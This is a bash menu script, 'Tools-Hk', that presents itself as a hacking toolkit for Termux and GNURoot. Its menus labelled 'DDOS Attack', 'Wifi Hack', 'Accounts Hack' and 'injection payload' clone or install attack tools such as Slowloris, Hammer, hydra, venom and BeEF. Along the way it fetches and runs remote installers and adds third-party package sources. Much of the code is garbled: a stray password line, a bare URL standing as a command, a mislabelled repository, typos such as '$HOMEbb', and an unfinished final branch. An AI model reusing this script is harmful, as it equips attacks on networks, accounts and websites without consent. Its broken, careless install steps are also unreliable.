#!bin/bash

clear
red='\e[1;31m'
green='\e[1;32m' 
blue='\e[1;34m' 
purple='\e[1;35m'
cyan='\e[1;36m' 
white='\e[1;37m'
yellow='\e[1;33m'
echo ''
echo ''
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-------------------------------------------"
echo -e $green"--------------$yellow(2 in 1) ---------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED Info <====="
echo ''
echo -e $green   "1- Tools-Gnuroot"
echo ""
echo -e $green   "2- Tools-Termux"
echo ""
echo -e $green   "3- Usage"
echo ""
echo -e $green   "4- Repair Termux & Gnuroot"
echo ""
echo -e $green   "5- About me"
echo ""
echo -e $green   "0- EXIT |-|"
echo "" 
echo "" 
echo -e $green "Enter The Number:" 
echo -e $red
###################################
read name
if [ $name = 1 ]
then 
clear
echo ""
echo "" 
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------" 
echo -e $green"--------------$yellow(2 in 1) ------------" 
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo '' 
echo -e $red "Gnuroot"
echo ""
echo -e $green "1- DDOS Attack"
echo ""
echo -e $green "2- Sniffing" 
echo "" 
echo -e $green "3- Wifi Hack"
echo ""
echo -e $green "4- webSite Hack"
echo ""
echo -e $green "5- Accounts Hack"
echo ""
echo -e $green "6- creat Backup"
echo ""
echo -e $green "7- injection payload"
echo ""
echo -e $green "8- other"
echo ""
echo -e $green "00- back" 
echo "" 
echo "" 
echo -e $green "Enter The Number:"
echo -e $red
read Gnuroot
if [ $Gnuroot = 1 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ------------"$
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "DDOS Attack"
echo ""
echo -e $green "1- Slowloris"
echo ""
echo -e $green "2- Hammer"
echo ""
echo -e $green "3- Metasploit"
echo ""
echo -e $green "00- Back"
read Ddos
if [ $Ddos = 1 ]
then
clear
echo -e $red
figlet "Slowloris"
cd ~
git clone https://github.com/gkbrk/slowloris.git
bash Tools-Hk.sh
fi
if [ $Ddos = 2 ]
then
clear
echo -e $red
figlet "Hammer"
cd ~
git clone https://github.com/cyweb/hammer.git
bash Tools-Hk.sh
fi
if [ $Ddos = 4 ]
then
clear
echo -e $red
figlet "Metasploit-FrameWork"
cd ~
apt-get install curl
adduser m-info
123456
su m-info
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb 
>msfinstall && \
chmod 755 msfinstall && \ 
./msfinstall
bash Tools-Hk.sh
fi
if [ $Ddos = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 2 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Sniffing"
echo ""
echo -e $green "1- Websploit"
echo ""
echo -e $green "2- Routersploit"
echo ""
echo -e $green "3- Metasploit"
echo ""
echo -e $green "00- Back"
read sniffing
if [ $sniffing = 1 ]
then
clear
echo -e $red
figlet "Websploit"
cd ~
apt install python2 
pip  install requests
git clone https://github.com/m4ll0k/wpsploit
bash Tools-Hk.sh
fi
if [ $sniffing = 2 ]
then
clear
echo -e $red
figlet "Routersploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $sniffing = 3 ]
then
clear
echo -e $red
figlet "Metasploit-FrameWork"
cd ~
apt-get install curl
adduser m-info
123456
su m-info
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb 
>msfinstall && \
chmod 755 msfinstall && \ 
./msfinstall
bash Tools-Hk.sh
fi
if [ $sniffing = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 3 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) -------------"$
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Wifi Hack"
echo ""
echo -e $green "1- Wifite"
echo ""
echo -e $green "2- aircrack-ng"
echo ""
echo -e $green "3- HT-WPS-Breaker"
echo ""
echo -e $green "4- fluxion"
echo ""
echo -e $green "5- Routersploit"
echo ""
echo -e $green "6- airgeddon"
echo ""
echo -e $green "00- Back"
echo ""
read wifi
if [ $wifi = 1 ]
then
clear
echo -e $red
figlet "wifite"
cd ~
apt-get install wifite
bash Tools-Hk.sh
fi
if [ $wifi = 2 ]
then
clear
echo -e $red
figlet "aircrack-ng"
cd ~
apt-get install aircrack-ng
bash Tools-Hk.sh
fi
if [ $wifi = 3 ]
then
clear
echo -e $red
figlet "HT-WPS-Breaker"
cd ~
https://github.com/SilentGhostX/HT-WPS-Breaker
bash Tools-Hk.sh
fi
if [ $wifi = 4 ]
then
clear
echo -e $red
figlet "fluxion"
cd ~ 
git clone https://github.com/facebook/flux.git
bash Tools-Hk.sh
fi
if [ $wifi = 5 ]
then
clear
echo -e $red
figlet "Routersploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $wifi = 6 ]
then
clear
echo -e $red
figlet "airgeddon"
cd ~
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
bash Tools-Hk.sh
fi
if [ $wifi = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 4 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "WebSite Hack"
echo ""
echo -e $green "1- Sqlmap"
echo ""
echo -e $green "2- webscan"
echo ""
echo -e $green "3- tor"
echo ""
echo -e $green "4- scriptux"
echo ""
echo -e $green "5- Sitebroker"
echo ""
echo -e $green "6- nmap"
echo ""
echo -e $green "7- Devploit"
echo ""
echo -e $green "8- Iplocator"
echo ""
echo -e $green "9- sniper-h"
echo ""
echo -e $green "10- hash-identifier"
echo ""
echo -e $green "11- dirsearch"
echo ""
echo -e $green "12- Google-Dork-Scan"
echo ""
echo -e $green "13- zenmap"
echo ""
echo -e $green "00- Back"
read website
if [ $website = 1 ]
then
clear
echo -e $red
figlet "Sqlmap"
cd ~
git clone https://github.com/sqlmapproject/sqlmap
bash Tools-Hk.sh
fi
if [ $website = 2 ]
then
clear
echo -e $red
figlet "webscan"
cd ~
git clone https://github.com/kost/docker-webscan
bash Tools-Hk.sh
fi
if [ $website = 3 ]
then
clear
echo -e $red
figlet "tor"
cd ~
apt-get install tor -y
fi
if [ $website = 4 ]
then
clear
echo -e $red
figlet "scriptux"
cd ~
git clone https://github.com/Gameye98/Scriptux
bash Tools-Hk.sh
fi
if [ $website = 5 ]
then
clear
echo -e $red
figlet "sitebroker"
cd ~
git clone https://github.com/Anon-Exploiter/SiteBroker
bash Tools-Hk.sh
fi
if [ $website = 6 ]
then
clear
echo -e $red
figlet "nmap"
apt install nmap
fi
if [ $website = 7 ]
then
clear
echo -e $red
figlet "Devploit"
git clone https://github.com/joker25000/Devploit
bash Tools-Hk.sh
fi
if [ $website = 8 ]
then
clear
echo -e $red
figlet "IPlocator"
cd ~
git clone https://github.com/AndreasBriese/ipLocator
bash Tools-Hk.sh
fi
if [ $website = 9 ]
then
clear
echo -e $red
figlet "sniper-h"
git clone https://github.com/laser010/sniper-h
bash Tools-Hk.sh
fi
if [ $website = 10 ]
then
clear
echo -e $red
figlet "hash-identifier"
git clone https://github.com/Miserlou/Hash-Identifier
bash Tools-Hk.sh
fi
if [ $website = 11 ]
then
clear
echo -e $red
figlet "dirsearch"
cd ~
git clone https://github.com/maurosoria/dirsearch
fi
if [ $website = 12 ]
then
clear
echo -e $red
figlet "Google-Dork-Scan"
cd ~
git clone https://github.com/ReiGelado/Google-Dork-Scan
bash Tools-Hk.sh
fi
if [ $website = 13 ]
then
clear
echo -e $red
figlet "zenmap"
cd ~
apt-get install zenmap
bash Tools-Hk.sh
fi
if [ $website = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 5 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Account Hack"
echo ""
echo -e $green "1- hydra"
echo ""
echo -e $green "2- crunch(list password)"
echo ""
echo -e $green "00- Back"
echo ""
read account_Hack
if [ $account_Hack = 1 ]
then
clear
echo -e $red
figlet "hydra"
cd ~
apt-get install hydra
bash Tools-Hk.sh
fi
if [ $account_Hack = 2 ]
then
clear
echo -e $red
figlet "crunch"
cd ~
apt-get install crunch
bash Tools-Hk.sh
fi
if [ $account_Hack = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 6 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Backup / Recovery"
echo ""
echo -e $green "1- Backup"
echo ""
echo -e $green "2- Recovery"
echo ""
echo -e $green "00- Back"
echo ""
read backup_recovery
if [ $backup_recovery = 1 ]
then
clear
echo -e $red
figlet "backup"
cd ~
apt update && apt upgrade
cd /data/data/com.gnuroot.debian/
tar -cvzf /sdcard/buckup-gnuroot.tgz 
app_HOME cache databases debian files lib 
support shared_prefs
fi
if [ $backup_recovery = 2 ]
then
clear
echo -e $red
figlet "Recovery"
cd ~
apt update && apt upgrade
cd /data/data/com.gnuroot.debian/
tar -xvzf /sdcard/buckup-gnuroot.tgz
bash Tools-Hk.sh
fi
if [ $backup_recovery = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 00 ]
then
clear
bash Tools-Hk.sh
fi
if [ $Gnuroot = 7 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "PAYLOAD"
echo ""
echo -e $green "1- Venom"
echo ""
echo -e $green "2- PAYMAX"
echo ""
echo -e $green "3- txtool"
echo ""
echo -e $green "00- Back"
echo ""
read payload2
if [ $payload2 = 1 ]
then
clear
echo -e $red
figlet "venom"
cd ~
git clone https://github.com/r00t-3xp10it/venom 
bash Tools-Hk.sh
fi
if [ $payload2 = 2 ]
then
clear
echo -e $red
figlet "PAYMAX"
cd ~
git clone https://github.com/Matrix07ksa/PAYMAX
bash Tools-Hk.sh
fi
if [ $payload2 = 3 ]
then
clear
echo -e $red
figlet "Txtool"
cd ~
git clone https://github.com/kuburan/txtool
bash Tools-Hk.sh
fi
if [ $payload2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 8 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Other"
echo ""
echo -e $green "1- spammer-Grab"
echo ""
echo -e $green "2- Ngrok"
echo ""
echo -e $green "3- change style"
echo ""
echo -e $green "4- style lxde"
echo ""
echo -e $green "5- wireshark"
echo ""
echo -e $green "6- nano"
echo ""
echo -e $green "00- Back "
echo ""
read other
if [ $other = 1 ]
then
clear
echo -e $red
figlet "spammer-Grab"
cd ~
git clone https://github.com/p4kl0nc4t/Spammer-Grab
bash Tools-Hk.sh
fi
if [ $other = 2 ]
then
clear
echo -e $red
figlet "Ngrok"
cd ~
git clone https://github.com/themastersunil/ngrok
bash Tools-Hk.sh
fi
if [ $other = 3 ]
then
clear
echo -e $red
figlet "change stayle"
cd ~
git clone https://github.com/profionaldhim/etc/blob/master/bash.bashrc
cp bash.bashrc etc
cd etc
rm -rif motd
bash Tools-Hk.sh
fi
if [ $other = 4 ]
then
clear
echo -e $red
figlet "lxde"
cd ~
apt-get install xterm
apt-get install lxde 
bash Tools-Hk.sh
fi
if [ $other = 5 ]
then
clear
echo -e $red
figlet "wireshark"
cd ~
apt-get install wireshark
bash Tools-Hk.sh
fi
if [ $other = 6 ]
then
clear
echo -e $red
figlet "nano"
cd ~
apt-get install nano -y
fi
if [ $other = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
fi
if [ $name = 2 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Termux"
echo ""
echo -e $green "1- DDOS Attack"
echo ""
echo -e $green "2- Sniffing"
echo ""
echo -e $green "3- Wifi Hack"
echo ""
echo -e $green "4- webSite Hack"
echo ""
echo -e $green "5- Accounts Hack"
echo ""
echo -e $green "6- creat Backup"
echo ""
echo -e $green "7- injection payload"
echo ""
echo -e $green "8- other"
echo ""
echo -e $green "00- back"
echo ""
read termux
if [ $termux = 1 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-------------------------------------"
echo -e $green"--------------$yellow(2 in 1) ------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "DDOS Attack"
echo ""
echo -e $green "1- Slowloris"
echo ""
echo -e $green "2- Hammer"
echo ""
echo -e $green "3- Metasploit"
echo ""
echo -e $green "00- Back"
echo ""
read ddos_termux
if [ $ddos_termux = 1 ]
then
clear
echo -e $red
figlet "slowloris"
cd ~
git clone https://github.com/gkbrk/slowloris.git
fi
if [ $ddos_termux = 2 ]
then
clear
echo -e $red
figlet "Hammer"
cd ~
git clone https://github.com/cyweb/hammer.git
fi
if [ $ddos_termux = 3 ]
then
clear
echo -e $red
figlet "metasploit"
cd ~
apt install git wget curl
apt install -y util-linux;apt install figlet
termux-setup-storage
apt install -y autoconf bison clang coreutils axel curl findutils git apr apr-util libffi-dev libgmp-dev libpcap-dev postgresql-dev readline-dev libsqlite-dev openssl-dev libtool libxml2-dev libxslt-dev ncurses-dev pkg-config wget make ruby-dev libgrpc-dev termux-tools ncurses-utils ncurses unzip zip tar postgresql termux-elf-cleaner
#Install metasploit-framework v.4.16.16
cd $HOME
axel --alternate -c https://github.com/rapid7/metasploit-framework/archive/4.16.16.tar.gz
tar -xf $HOME/metasploit-framework-4.16.16.tar.gz
mv $HOME/metasploit-framework-4.16.16 $HOME/metasploit-framework
rm $HOME/4.16.16.tar.gz
cd $HOME/metasploit-framework
sed '/rbnacl/d' -i Gemfile.lock
sed '/rbnacl/d' -i metasploit-framework.gemspec
gem install bundler
sed 's|nokogiri (1.*)|nokogiri (1.8.0)|g' -i Gemfile.lock                                             
gem install nokogiri -v 1.8.0 -- --use-system-libraries
#sed 's|grpc (.*|grpc (1.4.1)|g' -i $HOME/metasploit-framework/Gemfile.lock
#gem unpack grpc -v 1.4.1
#cd grpc-1.4.1
#curl -LO https://raw.githubusercontent.com/grpc/grpc/v1.4.1/grpc.gemspec
#curl -L https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/extconf.patch
#patch -p1 < extconf.patch
#gem build grpc.gemspec
#gem install grpc-1.4.1.gem
#cd ..
#rm -r grpc-1.4.1
cd $HOME/metasploit-framework                                                                                 bundle install -j5
$PREFIX/bin/find -type f -executable -exec termux-fix-shebang \{\} \;
rm ./modules/auxiliary/gather/http_pdf_authors.rb
if [ -e $PREFIX/bin/msfconsole ];then
        rm $PREFIX/bin/msfconsole
fi
        if [ -e $PREFIX/bin/msfvenom ];then
        rm $PREFIX/bin/msfvenom
fi
ln -s $HOME/metasploit-framework/msfconsole /data/data/com.termux/files/usr/bin/
ln -s $HOME/metasploit-framework/msfvenom /data/data/com.termux/files/usr/bin/
termux-elf-cleaner /data/data/com.termux/files/usr/lib/ruby/gems/2.4.0/gems/pg-0.20.0/lib/pg_ext.so

#Reapiring nokogiri issues
bundle update nokogiri
mv $HOME/McDoda-Install-MetaSploit/RuGiR $HOME/metasploit-framework/
#Creating data base
mv $HOME/McDoda-Install-MetaSploit/database.yml $HOME/metasploit-framework/config
cd $HOME/metasploit-framework/config
mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql

pg_ctl -D $PREFIX/var/lib/postgresql start
createuser msf
createdb msf_database
pg_ctl -D $PREFIX/var/lib/postgresql start
rm -r $HOME/McDoda-Install-MetaSploit
rm -r $HOME/metasploit-framework-4.16.16.tar.gz

cd $HOME/metasploit-framework
gem install nokogiri -- --use-system-libraries

clear
echo -e $green "Done....."
echo -e $green "Type 'msfconsole' to start."
fi
if [ $ddos_termux = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 2 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Sniffing"
echo ""
echo -e $green "1- Websploit"
echo ""
echo -e $green "2- Routersploit"
echo ""
echo -e $green "3- Metasploit"
echo ""
echo -e $green "4- BeEF"
echo ""
echo -e $green "00- Back"
read ter_sniffing
if [ $ter_sniffing = 1 ]
then
clear
echo -e $red
figlet "Websploit"
cd ~
pkg install python2
pip2  install requests
git clone https://github.com/websploit/websploit
bash Tools-Hk.sh
fi
if [ $ter_sniffing = 2 ]
then
clear
echo -e $red
figlet "Routersploit"
cd ~
git clone
https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $ter_sniffing = 3 ]
then
clear
echo -e $red
figlet "metasploit-framework"
cd ~
pkg install git wget curl
apt install -y util-linux;apt install figlet
termux-setup-storage
apt install -y autoconf bison clang 
coreutils axel curl findutils git apr 
apr-util libffi-dev libgmp-dev libpcap-dev 
postgresql-dev readline-dev libsqlite-dev 
openssl-dev libtool libxml2-dev libxslt-dev 
ncurses-dev pkg-config wget make ruby-dev 
libgrpc-dev termux-tools ncurses-utils 
ncurses unzip zip tar postgresql 
termux-elf-cleaner
#Install metasploit-framework v.4.16.16
cd $HOME
axel --alternate -c 
https://github.com/rapid7/metasploit-framework/archive/4.16.16.tar.gz
tar -xf 
$HOME/metasploit-framework-4.16.16.tar.gz
mv $HOME/metasploit-framework-4.16.16 
$HOME/metasploit-framework
rm $HOME/4.16.16.tar.gz
cd $HOME/metasploit-framework
sed '/rbnacl/d' -i Gemfile.lock
sed '/rbnacl/d' -i 
metasploit-framework.gemspec
gem install bundler
sed 's|nokogiri (1.*)|nokogiri (1.8.0)|g' 
-i Gemfile.lock
gem install nokogiri -v 1.8.0 -- 
--use-system-libraries

#sed 's|grpc (.*|grpc (1.4.1)|g' -i 
$HOME/metasploit-framework/Gemfile.lock
#gem unpack grpc -v 1.4.1
#cd grpc-1.4.1
#curl -LO 
https://raw.githubusercontent.com/grpc/grpc/v1.4.1/grpc.gemspec
#curl -L 
https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/extconf.patch
#patch -p1 < extconf.patch
#gem build grpc.gemspec
#gem install grpc-1.4.1.gem
#cd ..
#rm -r grpc-1.4.1
cd $HOME/metasploit-framework                                               
bundle install -j5
$PREFIX/bin/find -type f -executable -exec 
termux-fix-shebang \{\} \;
rm ./modules/auxiliary/gather/http_pdf_authors.rb
if [ -e $PREFIX/bin/msfconsole ];then
        rm $PREFIX/bin/msfconsole
fi
        if [ -e $PREFIX/bin/msfvenom ];then
        rm $PREFIX/bin/msfvenom
fi
ln -s $HOME/metasploit-framework/msfconsole 
/data/data/com.termux/files/usr/bin/
ln -s $HOME/metasploit-framework/msfvenom 
/data/data/com.termux/files/usr/bin/
termux-elf-cleaner 
/data/data/com.termux/files/usr/lib/ruby/gems/2.4.0/gems/pg-0.20.0/lib/pg_ext.so

#Reapiring nokogiri issues
bundle update nokogiri
mv $HOME/McDoda-Install-MetaSploit/RuGiR 
$HOME/metasploit-framework/
#Creating data base
mv $HOME/McDoda-Install-MetaSploit/database.yml 
$HOME/metasploit-framework/config
cd $HOME/metasploit-framework/config
mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql

pg_ctl -D $PREFIX/var/lib/postgresql start
createuser msf
createdb msf_database
pg_ctl -D $PREFIX/var/lib/postgresql start
rm -r $HOMEbb/McDoda-Install-MetaSploit
rm -r $HOME/metasploit-framework-4.16.16.tar.gz

cd $HOME/metasploit-framework
gem install nokogiri -- --use-system-libraries
clear
echo -e $green "Done....."
echo -e $green "Type 'msfconsole' to start."
bash Tools-Hk.sh
fi
if [ $ter_sniffing = 4 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "BEeF"
echo ""
echo -e $yellow "Note : before any thing copy this code to your terminal dpkg --print-architecture"
echo ""
echo ""
echo -e $green "1- _aarch64/armv8/armv8l/arm64_"
echo ""
echo -e $green "2- _armhf/armv7l/arm/arm5vl_"
echo ""
echo -e $green "00- back"
echo ""
read Bef
if [ $Bef = 1 ]
then
clear
apt update && apt upgrade -y
pkg install wget
wget 
https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/sources-aarch64.list.txt
mv sources-aarch64.list.txt sources.list
mv sources.list $PREFIX/etc/apt
wget https://xeffyr.github.io/termux-x-repository/pubkey.gpg
apt update && apt upgrade -y
apt-get install gnupg gnupg2 -y
apt-key add pubkey.gpg
apt-get install beef-xss -y
beef
fi
if [ $Bef = 2 ]
then
clear
apt update && apt upgrade -y
pkg install wget
wget https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/sources-arm.list.txt
mv sources- sources.list
mv sources.list $PREFIX/etc/apt
wget https://xeffyr.github.io/termux-x-repository/pubkey.gpg
apt update && apt upgrade -y
apt-get install gnupg gnupg2 -y
apt-key add pubkey.gpg
apt-get install beef-xss -y
beef
fi
if [ $Bef = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $ter_sniffing = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 3 ]
then
clear

echo -e $green"-----------------------------------"
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Wifi Hack"
echo ""
echo -e $green "1- Wifite"
echo ""
echo -e $green "2- wifite2"
echo ""
echo -e $green "3- HT-WPS-Breaker"
echo ""
echo -e $green "4- fluxion"
echo ""
echo -e $green "5- Routersploit"
echo ""
echo -e $green "6- airgeddon"
echo ""
echo -e $green "00- Back"
echo ""
read wifi2
if [ $wifi2 = 1 ]
then
clear
echo -e $red
figlet "wifite"
cd ~
wget https://raw.github.com/derv82/wifite/master/wifite.py
bash Tools-Hk.sh
fi
if [ $wifi2 = 2 ]
then
clear
echo -e $red
figlet "wifite2"
cd ~
git clone https://github.com/derv82/wifite2.git
bash Tools-Hk.sh
fi
if [ $wifi2 = 3 ]
then
clear
echo -e $red
figlet "HT-WPS-Breaker"
cd ~
git clone https://github.com/SilentGhostX/HT-WPS-Breaker
bash Tools-Hk.shfi
fi
if [ $wifi2 = 4 ]
then
clear
echo -e $red
figlet "fluxion"
cd ~
git clone https://github.com/facebook/flux.git
bash Tools-Hk.sh
fi
